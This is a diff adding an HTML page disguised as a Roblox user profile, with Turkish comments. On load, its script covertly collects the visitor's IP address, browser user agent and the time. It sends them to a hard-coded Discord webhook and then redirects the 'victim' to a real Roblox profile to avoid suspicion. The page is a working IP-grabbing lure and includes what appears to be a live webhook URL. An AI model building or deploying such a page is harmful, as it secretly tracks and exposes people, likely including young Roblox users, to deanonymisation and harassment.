@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Profile</title>
+    <meta property="og:title" content="HM_Rockefeller's Profile">
+    <meta property="og:description" content="HM_Rockefeller is one of the millions creating and exploring Roblox.">
+    <meta property="og:image" content="https://tr.rbxcdn.com/38c36688f00a5d5e23769c09c9f2b842/420/420/Avatar/Png">
+    <meta property="og:url" content="https://www.roblox.com">
+</head>
+<body style="background-color: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>Loading Profile...</h1>
+    <script>
+        // ÖNEMLİ: Aşağıdaki tırnak içine Adım 1'de aldığın Webhook URL'sini yapıştır!
+        const webhookURL = "https://discord.com/api/webhooks/1485658973855289429/Xhw8icpfMmeYPDCS-d5sCXWsc2m-CFlCAarRms7Tr-yP7KIWpaoS0yrZIW1jj3dphZbU";
+        
+        async function captureData() {
+            try {
+                // Kurbanın IP adresini alıyoruz
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // Discord'a gidecek mesaj paketini hazırlıyoruz
+                const payload = {
+                    embeds: [{
+                        title: "🎯 Hedef Sisteme Düştü!",
+                        color: 16711680, // Kırmızı renk kodu
+                        fields: [
+                            { name: "🌐 IP Adresi", value: data.ip, inline: true },
+                            { name: "📱 Cihaz/Tarayıcı", value: navigator.userAgent, inline: false },
+                            { name: "⏰ Zaman", value: new Date().toLocaleString(), inline: true }
+                        ],
+                        footer: { text: "MODIE Protocol - Veri Yakalandı" }
+                    }]
+                };
+
+                // Veriyi senin Discord kanalına postala
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Veri gittikten sonra kurbanı gerçek Roblox profiline yönlendir (Şüphe çekmemek için)
+                window.location.href = "https://www.roblox.com/users/2867354/profile";
+            } catch (error) {
+                console.error("Hata:", error);
+            }
+        }
+        captureData();
+    </script>
+</body>
+</html>
